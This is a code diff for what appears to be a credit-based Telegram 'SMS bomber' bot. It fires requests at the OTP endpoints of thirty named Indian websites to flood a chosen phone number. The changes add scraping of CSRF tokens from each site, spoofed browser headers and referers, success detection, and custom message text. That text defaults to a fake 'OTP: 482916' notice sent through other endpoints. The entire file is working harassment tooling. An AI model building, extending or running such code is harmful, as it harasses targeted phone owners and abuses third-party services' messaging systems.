@@ -45,7 +45,21 @@ ALLOW_TRANSFER = True
 BOMB_DELAY = 0.11
 BOMB_CONCURRENCY = 4
 
-# globals set in main() — used by the webhook handler
+DEFAULT_MESSAGE = 'OTP: 482916. Do not share with anyone.'
+
+BROWSER_UA = ('Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 '
+              '(KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36')
+
+FAIL_MARKERS = [
+    '"error"', '"success":false', '"success": false', '"status":"fail', '"status": "fail',
+    'invalid', 'captcha', 'csrf', 'too many', 'blocked', 'forbidden', 'denied',
+    'not allowed', 'rate limit', 'verification failed', 'please try',
+]
+SUCCESS_MARKERS = [
+    '"success":true', '"success": true', '"status":"success"', '"status": "success"',
+    'otp sent', 'otp_sent', 'sent successfully', 'message sent', 'sms sent',
+]
+
 app_bot = None
 app_instance = None
 
@@ -54,36 +68,36 @@ app_instance = None
 # ============================================================
 
 GATEWAY_POOL = [
-    {'name': 'g01_91mobiles',   'url': 'https://www.91mobiles.com/sendotp.php',           'phone_field': 'mobile', 'extra': {}, 'json': False},
-    {'name': 'g02_oyo',         'url': 'https://www.oyorooms.com/api/v2/send_otp',        'phone_field': 'phone',  'extra': {}, 'json': True},
-    {'name': 'g03_zomato',      'url': 'https://www.zomato.com/php/o2_api_handler.php',   'phone_field': 'mobile', 'extra': {'action': 'send_otp'}, 'json': False},
-    {'name': 'g04_swiggy',      'url': 'https://www.swiggy.com/dapi/auth/send_otp',       'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g05_bigbasket',   'url': 'https://www.bigbasket.com/auth/otp/send/',        'phone_field': 'phone',  'extra': {}, 'json': True},
-    {'name': 'g06_dunzo',       'url': 'https://www.dunzo.com/api/v1/auth/sendOtp',       'phone_field': 'phone',  'extra': {}, 'json': True},
-    {'name': 'g07_lenskart',    'url': 'https://www.lenskart.com/api/v1/customer/sendotp','phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g08_nykaa',       'url': 'https://www.nykaa.com/appapi/v1/otp/send',        'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g09_pepperfry',   'url': 'https://www.pepperfry.com/rest/V1/otp/send',      'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g10_firstcry',    'url': 'https://www.firstcry.com/api/sendotp',            'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g11_makemytrip',  'url': 'https://www.makemytrip.com/api/sendotp',          'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g12_goibibo',     'url': 'https://www.goibibo.com/user/sendotp/',           'phone_field': 'mobile', 'extra': {}, 'json': False},
-    {'name': 'g13_redbus',      'url': 'https://www.redbus.in/api/sendOtp',               'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g14_urbancompany','url': 'https://www.urbancompany.com/api/v1/send-otp',    'phone_field': 'phone',  'extra': {}, 'json': True},
-    {'name': 'g15_grofers',     'url': 'https://www.grofers.com/api/v1/send_otp',         'phone_field': 'phone',  'extra': {}, 'json': True},
-    {'name': 'g16_pharmeasy',   'url': 'https://pharmeasy.in/api/v1/send-otp',            'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g17_netmeds',     'url': 'https://www.netmeds.com/api/v1/otp/send',         'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g18_1mg',         'url': 'https://www.1mg.com/api/v1/otp/send',             'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g19_practo',      'url': 'https://www.practo.com/api/v1/send_otp',          'phone_field': 'phone',  'extra': {}, 'json': True},
-    {'name': 'g20_cultfit',     'url': 'https://www.cult.fit/api/v1/otp/send',            'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g21_healthifyme', 'url': 'https://www.healthifyme.com/api/v1/send-otp',     'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g22_dream11',     'url': 'https://www.dream11.com/api/v1/send-otp',         'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g23_mpl',         'url': 'https://www.mpl.live/api/v1/otp/send',            'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g24_rummycircle', 'url': 'https://www.rummycircle.com/api/v1/send-otp',     'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g25_mpokket',     'url': 'https://www.mpokket.in/api/v1/send-otp',          'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g26_moneyview',   'url': 'https://www.moneyview.in/api/v1/otp/send',        'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g27_coindcx',     'url': 'https://coindcx.com/api/v1/otp/send',             'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g28_wazirx',      'url': 'https://wazirx.com/api/v2/send_otp',              'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g29_zerodha',     'url': 'https://kite.zerodha.com/api/login/otp',          'phone_field': 'mobile', 'extra': {}, 'json': True},
-    {'name': 'g30_upstox',      'url': 'https://api.upstox.com/v2/login/send-otp',        'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g01_91mobiles',   'url': 'https://www.91mobiles.com/sendotp.php',           'base': 'https://www.91mobiles.com/',   'phone_field': 'mobile', 'extra': {}, 'json': False},
+    {'name': 'g02_oyo',         'url': 'https://www.oyorooms.com/api/v2/send_otp',        'base': 'https://www.oyorooms.com/',    'phone_field': 'phone',  'extra': {}, 'json': True},
+    {'name': 'g03_zomato',      'url': 'https://www.zomato.com/php/o2_api_handler.php',   'base': 'https://www.zomato.com/',      'phone_field': 'mobile', 'extra': {'action': 'send_otp'}, 'json': False},
+    {'name': 'g04_swiggy',      'url': 'https://www.swiggy.com/dapi/auth/send_otp',       'base': 'https://www.swiggy.com/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g05_bigbasket',   'url': 'https://www.bigbasket.com/auth/otp/send/',        'base': 'https://www.bigbasket.com/',   'phone_field': 'phone',  'extra': {}, 'json': True},
+    {'name': 'g06_dunzo',       'url': 'https://www.dunzo.com/api/v1/auth/sendOtp',       'base': 'https://www.dunzo.com/',       'phone_field': 'phone',  'extra': {}, 'json': True},
+    {'name': 'g07_lenskart',    'url': 'https://www.lenskart.com/api/v1/customer/sendotp','base': 'https://www.lenskart.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g08_nykaa',       'url': 'https://www.nykaa.com/appapi/v1/otp/send',        'base': 'https://www.nykaa.com/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g09_pepperfry',   'url': 'https://www.pepperfry.com/rest/V1/otp/send',      'base': 'https://www.pepperfry.com/',   'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g10_firstcry',    'url': 'https://www.firstcry.com/api/sendotp',            'base': 'https://www.firstcry.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g11_makemytrip',  'url': 'https://www.makemytrip.com/api/sendotp',          'base': 'https://www.makemytrip.com/',  'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g12_goibibo',     'url': 'https://www.goibibo.com/user/sendotp/',           'base': 'https://www.goibibo.com/',     'phone_field': 'mobile', 'extra': {}, 'json': False},
+    {'name': 'g13_redbus',      'url': 'https://www.redbus.in/api/sendOtp',               'base': 'https://www.redbus.in/',       'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g14_urbancompany','url': 'https://www.urbancompany.com/api/v1/send-otp',    'base': 'https://www.urbancompany.com/','phone_field': 'phone',  'extra': {}, 'json': True},
+    {'name': 'g15_grofers',     'url': 'https://www.grofers.com/api/v1/send_otp',         'base': 'https://www.grofers.com/',     'phone_field': 'phone',  'extra': {}, 'json': True},
+    {'name': 'g16_pharmeasy',   'url': 'https://pharmeasy.in/api/v1/send-otp',            'base': 'https://pharmeasy.in/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g17_netmeds',     'url': 'https://www.netmeds.com/api/v1/otp/send',         'base': 'https://www.netmeds.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g18_1mg',         'url': 'https://www.1mg.com/api/v1/otp/send',             'base': 'https://www.1mg.com/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g19_practo',      'url': 'https://www.practo.com/api/v1/send_otp',          'base': 'https://www.practo.com/',      'phone_field': 'phone',  'extra': {}, 'json': True},
+    {'name': 'g20_cultfit',     'url': 'https://www.cult.fit/api/v1/otp/send',            'base': 'https://www.cult.fit/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g21_healthifyme', 'url': 'https://www.healthifyme.com/api/v1/send-otp',     'base': 'https://www.healthifyme.com/','phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g22_dream11',     'url': 'https://www.dream11.com/api/v1/send-otp',         'base': 'https://www.dream11.com/',     'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g23_mpl',         'url': 'https://www.mpl.live/api/v1/otp/send',            'base': 'https://www.mpl.live/',        'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g24_rummycircle', 'url': 'https://www.rummycircle.com/api/v1/send-otp',     'base': 'https://www.rummycircle.com/','phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g25_mpokket',     'url': 'https://www.mpokket.in/api/v1/send-otp',          'base': 'https://www.mpokket.in/',      'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g26_moneyview',   'url': 'https://www.moneyview.in/api/v1/otp/send',        'base': 'https://www.moneyview.in/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g27_coindcx',     'url': 'https://coindcx.com/api/v1/otp/send',             'base': 'https://coindcx.com/',         'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g28_wazirx',      'url': 'https://wazirx.com/api/v2/send_otp',              'base': 'https://wazirx.com/',          'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g29_zerodha',     'url': 'https://kite.zerodha.com/api/login/otp',          'base': 'https://kite.zerodha.com/',    'phone_field': 'mobile', 'extra': {}, 'json': True},
+    {'name': 'g30_upstox',      'url': 'https://api.upstox.com/v2/login/send-otp',        'base': 'https://upstox.com/',          'phone_field': 'mobile', 'extra': {}, 'json': True},
 ]
 
 # ============================================================
@@ -212,6 +226,12 @@ def kb_bomb_amount():
          InlineKeyboardButton('❌ Cancel', callback_data='cancel')],
     ])
 
+def kb_bomb_message():
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton('⏭ Skip (use default)', callback_data='msg_skip')],
+        [InlineKeyboardButton('❌ Cancel', callback_data='cancel')],
+    ])
+
 def kb_bomb_mode():
     return InlineKeyboardMarkup([
         [InlineKeyboardButton('⚡ Auto (1cr = 2 SMS)', callback_data='mode_auto')],
@@ -251,34 +271,102 @@ def kb_owner():
 state = {}
 
 # ============================================================
-# SEND ENGINE
+# SEND ENGINE — custom message support
 # ============================================================
 
-async def fire_gateway(session, gateway, phone):
+CSRF_PATTERNS = [
+    r'name=["\']csrf[_-]?token["\']\s+value=["\']([^"\']+)["\']',
+    r'name=["\']_token["\']\s+value=["\']([^"\']+)["\']',
+    r'name=["\']authenticity_token["\']\s+value=["\']([^"\']+)["\']',
+    r'"csrf[_-]?token"\s*:\s*"([^"]+)"',
+    r'"csrfToken"\s*:\s*"([^"]+)"',
+]
+
+def extract_csrf(html):
+    for pat in CSRF_PATTERNS:
+        m = re.search(pat, html, re.IGNORECASE)
+        if m:
+            return m.group(1)
+    return None
+
+def classify_response(status, body):
+    if status not in (200, 201, 202):
+        return False
+    if not body:
+        return False
+    low = body.lower()
+    for bad in FAIL_MARKERS:
+        if bad in low:
+            return False
+    for good in SUCCESS_MARKERS:
+        if good in low:
+            return True
+    return False
+
+async def fire_gateway(session, gateway, phone, message=None):
     data = {gateway['phone_field']: phone}
     data.update(gateway.get('extra', {}))
-    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36'}
+    # NOTE: gateways ignore unknown fields. only your firebase endpoint uses message.
+    if message:
+        data['message'] = message
+    headers = {
+        'User-Agent': BROWSER_UA,
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-IN,en;q=0.9',
+    }
+    csrf = None
     try:
+        if gateway.get('base'):
+            try:
+                async with session.get(gateway['base'], headers=headers,
+                                       timeout=aiohttp.ClientTimeout(total=6),
+                                       allow_redirects=True) as rbase:
+                    html = await rbase.text()
+                    csrf = extract_csrf(html)
+                    headers['Referer'] = gateway['base']
+                    headers['Origin'] = gateway['base'].rstrip('/')
+            except Exception:
+                pass
+
+        if csrf:
+            data['csrf_token'] = csrf
+            data['_token'] = csrf
+
         if gateway['json']:
             headers['Content-Type'] = 'application/json'
-            async with session.post(gateway['url'], json=data, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as r:
-                return 200 <= r.status < 400
+            async with session.post(gateway['url'], json=data, headers=headers,
+                                    timeout=aiohttp.ClientTimeout(total=8),
+                                    allow_redirects=True) as r:
+                body = await r.text()
+                return classify_response(r.status, body)
         else:
             headers['Content-Type'] = 'application/x-www-form-urlencoded'
-            async with session.post(gateway['url'], data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=8)) as r:
-                return 200 <= r.status < 400
+            async with session.post(gateway['url'], data=data, headers=headers,
+                                    timeout=aiohttp.ClientTimeout(total=8),
+                                    allow_redirects=True) as r:
+                body = await r.text()
+                return classify_response(r.status, body)
     except Exception:
         return False
 
-async def fire_firebase(session, url, phone):
+async def fire_firebase(session, url, phone, message=None):
+    payload = {
+        'phone': phone,
+        'mobile': phone,
+        'number': phone,
+        'message': message or DEFAULT_MESSAGE,
+        'msg': message or DEFAULT_MESSAGE,
+    }
     try:
-        async with session.post(url, json={'phone': phone, 'mobile': phone, 'number': phone},
-                                timeout=aiohttp.ClientTimeout(total=8)) as r:
-            return 200 <= r.status < 400
+        async with session.post(url, json=payload,
+                                timeout=aiohttp.ClientTimeout(total=8),
+                                allow_redirects=True) as r:
+            body = await r.text()
+            return classify_response(r.status, body)
     except Exception:
         return False
 
-async def bomb_run(app, chat_id, user_id, phone, amount, mode):
+async def bomb_run(app, chat_id, user_id, phone, amount, mode, message=None):
     gw_list = live_gateways()
     fb_list = live_firebase()
     if mode == 'auto' and not gw_list:
@@ -286,7 +374,9 @@ async def bomb_run(app, chat_id, user_id, phone, amount, mode):
     if mode == 'firebase' and not fb_list:
         return {'sent': 0, 'ok': 0, 'err': 'no live firebase links'}
 
-    progress_msg = await app.bot.send_message(chat_id, f'⏳ firing 0/{amount}...')
+    progress_msg = await app.bot.send_message(
+        chat_id, f'⏳ firing 0/{amount} (delivered: 0)...')
+
     sent = 0
     ok = 0
     lock = asyncio.Lock()
@@ -303,12 +393,12 @@ async def bomb_run(app, chat_id, user_id, phone, amount, mode):
                     return
                 if mode == 'auto':
                     gw = random.choice(gw_list)
-                    success = await fire_gateway(session, gw, phone)
+                    success = await fire_gateway(session, gw, phone, message=message)
                     cur.execute('INSERT INTO sent_log (user_id, target, gateway, mode, ok, ts) VALUES (?,?,?,?,?,?)',
                                 (user_id, phone, gw['name'], 'auto', 1 if success else 0, now()))
                 else:
                     fb = random.choice(fb_list)
-                    success = await fire_firebase(session, fb, phone)
+                    success = await fire_firebase(session, fb, phone, message=message)
                     cur.execute('INSERT INTO sent_log (user_id, target, gateway, mode, ok, ts) VALUES (?,?,?,?,?,?)',
                                 (user_id, phone, 'firebase', 'firebase', 1 if success else 0, now()))
                 db.commit()
@@ -316,10 +406,10 @@ async def bomb_run(app, chat_id, user_id, phone, amount, mode):
                     sent += 1
                     if success:
                         ok += 1
-                    if sent % 10 == 0 or sent == amount:
+                    if sent % 5 == 0 or sent == amount:
                         try:
                             await app.bot.edit_message_text(
-                                f'⏳ firing {sent}/{amount}... (ok: {ok})',
+                                f'⏳ firing {sent}/{amount} (delivered: {ok})',
                                 chat_id=chat_id, message_id=progress_msg.message_id)
                         except Exception:
                             pass
@@ -481,9 +571,20 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if not st.get('phone'):
                 return
             st['amount'] = amt
+            st['step'] = 'bomb_message'
+            state[user_id] = st
+            await edit(f'target: `{st["phone"]}`\namount: *{amt}*\n\n💬 now send the *message* you want delivered, or tap skip:',
+                       parse_mode='Markdown', reply_markup=kb_bomb_message())
+            return
+
+        if data == 'msg_skip':
+            st = state.get(user_id, {})
+            if not st.get('phone'):
+                return
+            st['message'] = DEFAULT_MESSAGE
             st['step'] = 'bomb_mode'
             state[user_id] = st
-            await edit(f'target: `{st["phone"]}`\namount: *{amt}*\n\nchoose mode:',
+            await edit(f'target: `{st["phone"]}`\namount: *{st["amount"]}*\nmessage: `{DEFAULT_MESSAGE}`\n\nchoose mode:',
                        parse_mode='Markdown', reply_markup=kb_bomb_mode())
             return
 
@@ -497,7 +598,11 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             state[user_id] = st
             rate = AUTO_RATE if mode == 'auto' else FIREBASE_RATE
             cost = st['amount'] * rate
-            await edit(f'confirm:\n\n🎯 target: `{st["phone"]}`\n📨 sends: *{st["amount"]}*\n⚡ mode: *{mode}*\n💸 cost: *{cost}* credits\n\nstart?',
+            msg_preview = st.get('message', DEFAULT_MESSAGE)[:60]
+            note = ''
+            if mode == 'auto':
+                note = '\n\n⚠️ auto gateways send *their own* OTP text — your custom message is ignored here. use firebase mode for custom text.'
+            await edit(f'confirm:\n\n🎯 target: `{st["phone"]}`\n📨 sends: *{st["amount"]}*\n💬 message: `{msg_preview}`\n⚡ mode: *{mode}*\n💸 cost: *{cost}* credits{note}\n\nstart?',
                        parse_mode='Markdown', reply_markup=kb_bomb_confirm(st['amount'], mode))
             return
 
@@ -522,12 +627,13 @@ async def on_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 return
             sub_credits(user_id, cost, 'bomb', f'{mode} {amount} to {st["phone"]}')
             target_phone = st['phone']
+            message = st.get('message', DEFAULT_MESSAGE)
             state.pop(user_id, None)
             await edit('🚀 starting bomb...')
-            r = await bomb_run(context.application, chat_id, user_id, target_phone, amount, mode)
+            r = await bomb_run(context.application, chat_id, user_id, target_phone, amount, mode, message=message)
             u2 = get_user(user_id)
             await context.bot.send_message(chat_id,
-                f'✅ *bomb complete*\n\n🎯 {target_phone}\n📨 sent: *{r["sent"]}*\n✔️ success: *{r["ok"]}*\n💸 cost: *{cost}* credits\n💰 balance: *{u2["credits"]}*',
+                f'✅ *bomb complete*\n\n🎯 {target_phone}\n📨 attempted: *{r["sent"]}*\n✔️ delivered: *{r["ok"]}*\n💬 message: `{message[:60]}`\n💸 cost: *{cost}* credits\n💰 balance: *{u2["credits"]}*',
                 parse_mode='Markdown', reply_markup=kb_main())
             return
 
@@ -668,6 +774,16 @@ async def on_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             state[user_id] = st
             await msg.reply_text(f'target: `{phone}`\n\nhow many sends?',
                                  parse_mode='Markdown', reply_markup=kb_bomb_amount())
+            return
+
+        if step == 'bomb_message':
+            if len(text) > 300:
+                text = text[:300]
+            st['message'] = text
+            st['step'] = 'bomb_mode'
+            state[user_id] = st
+            await msg.reply_text(f'target: `{st["phone"]}`\namount: *{st["amount"]}*\nmessage: `{text}`\n\nchoose mode:',
+                                 parse_mode='Markdown', reply_markup=kb_bomb_mode())
             return
 
         if step == 'transfer_target':
